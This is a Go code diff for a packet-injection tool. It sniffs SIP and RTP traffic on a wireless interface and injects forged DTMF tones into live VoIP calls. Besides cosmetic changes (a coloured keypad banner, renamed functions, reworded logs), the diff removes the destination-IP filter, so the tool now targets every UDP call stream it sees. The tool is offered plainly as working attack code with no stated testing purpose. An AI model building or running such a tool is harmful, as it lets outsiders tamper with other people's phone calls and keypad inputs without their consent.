@@ -2,6 +2,7 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"log"
 	"strconv"
 	"strings"
@@ -14,10 +15,30 @@ import (
 )
 
 var (
+	black   = Color("\033[1;30m%s\033[0m")
+	red     = Color("\033[1;31m%s\033[0m")
+	green   = Color("\033[1;32m%s\033[0m")
+	yellow  = Color("\033[1;33m%s\033[0m")
+	purple  = Color("\033[1;34m%s\033[0m")
+	magenta = Color("\033[1;35m%s\033[0m")
+	teal    = Color("\033[1;36m%s\033[0m")
+	white   = Color("\033[1;37m%s\033[0m")
+	bold    = Color("\033[1m%s\033[0m")
+	grey    = Color("\033[2m%s\033[0m")
+)
+
+func Color(colorString string) func(...interface{}) string {
+	sprint := func(args ...interface{}) string {
+		return fmt.Sprintf(colorString,
+			fmt.Sprint(args...))
+	}
+	return sprint
+}
+
+var (
 	iface             = flag.String("i", "wlan0", "Interface to listen on")
-	dst               = flag.String("d", "", "Destination IP to filter by")
 	injectionInterval = flag.Duration("t", 3*time.Second, "Time between injection attempts")
-	sequence          = flag.Uint("s", 10, "Injection sequence offset (begin injecting packets at this sequence number)")
+	dtmfOffset        = flag.Uint("dtmf-offset", 200, "DTMF injection sequence offset (begin injecting packets at this sequence number)")
 )
 
 var (
@@ -34,7 +55,8 @@ func between(s, start, end string) string {
 	return strings.Split(sp[1], end)[0]
 }
 
-func modifyAndInject(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) error {
+// txUDP transmits a UDP packet from a given packet template and payload
+func txUDP(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) error {
 	*pkt.ApplicationLayer().(*gopacket.Payload) = payload
 	if err := pkt.TransportLayer().(*layers.UDP).SetNetworkLayerForChecksum(pkt.NetworkLayer()); err != nil {
 		return err
@@ -55,19 +77,28 @@ func modifyAndInject(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) e
 func main() {
 	flag.Parse()
 
-	log.Printf("Filtering by destination IP %s with injection sequence offset %d", *dst, *sequence)
-
 	handle, err := pcap.OpenLive(*iface, 262144, true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer handle.Close()
 
-	if err := handle.SetBPFFilter("udp and dst " + *dst); err != nil {
+	if err := handle.SetBPFFilter("udp"); err != nil {
 		log.Fatal(err)
 	}
 
-	log.Printf("Starting capture on %s", *iface)
+	fmt.Printf(`
+    ` + red("_________________") + `
+   ` + red("/   ._________.   \\") + grey(":.") + `
+   ` + red("|__|") + bold(" [1][2][3] ") + red("|__|") + grey(":  :") + `
+     /  ` + bold("[4][5][6]") + `  \   ` + grey(":  :") + `
+    /   ` + bold("[7][8][9]") + `   \   ` + grey(":..:") + `
+    | ` + bold("     [0]     ") + ` |   ` + grey(":..:") + `
+    '---------------'
+
+`)
+
+	log.Printf("Monitoring %s", *iface)
 	for pkt := range gopacket.NewPacketSource(handle, handle.LinkType()).Packets() {
 		// Decode UDP packet
 		udp := pkt.Layer(layers.LayerTypeUDP)
@@ -90,7 +121,7 @@ func main() {
 
 			// Check if stream seen
 			if _, ok := streams[rtph.SSRC]; !ok {
-				log.Printf("[RTP] Tracking stream (ssrc %d seq %d) to call %s", rtph.SSRC, rtph.Seq, call)
+				log.Printf("[Call %s] Tracking stream %d to call (seq %d)", call, rtph.SSRC, rtph.Seq)
 				streams[rtph.SSRC] = &rtpStream{
 					FirstSeen: time.Now(),
 				}
@@ -98,21 +129,21 @@ func main() {
 
 			// Check if it has been at least N seconds since last packet injection
 			stream := streams[rtph.SSRC]
-			if rtph.Seq >= uint16(*sequence) &&
+			if rtph.Seq >= uint16(*dtmfOffset) &&
 				(stream.LastInjected.IsZero() ||
 					time.Since(stream.LastInjected) > *injectionInterval) {
 
 				log.Printf(
-					"[RTP] Injecting DTMF tone [%s:%d -> %s:%d] SSRC %d call %s",
+					"[Call %s] Injecting DTMF tone into stream %d [%s:%d -> %s:%d]",
+					call,
+					rtph.SSRC,
 					pkt.NetworkLayer().NetworkFlow().Src(), udpLayer.SrcPort,
 					pkt.NetworkLayer().NetworkFlow().Dst(), udpLayer.DstPort,
-					rtph.SSRC,
-					call,
 				)
 
 				// Send DTMF tone
 				if err := sendDTMF(rtph.Seq+1, rtph.TS, rtph.SSRC, func(b []byte) error {
-					return modifyAndInject(handle, pkt, b)
+					return txUDP(handle, pkt, b)
 				}); err != nil {
 					log.Fatal(err)
 				}
@@ -129,14 +160,14 @@ func main() {
 				if err == nil {
 					// Register call if we haven't seen it before
 					if _, ok := calls[msg.CallID]; !ok {
-						log.Printf("[SIP] Tracking call from %s [Call ID %s] RTP local port %d", msg.From, msg.CallID, rtpLocalPort)
+						log.Printf("[Call %s] Tracking call from %s RTP local port %d", msg.CallID, msg.From, rtpLocalPort)
 						calls[msg.CallID] = uint16(rtpLocalPort)
 					}
 				}
 			} else {
 				// Cleanup when call is over
 				if msg.Phrase == "Ok" {
-					log.Printf("[SIP] Call ended (%s)", msg.CallID)
+					log.Printf("[Call %s] Call ended", msg.CallID)
 
 					// Delete call's RTP stream
 					localPort := calls[msg.CallID]
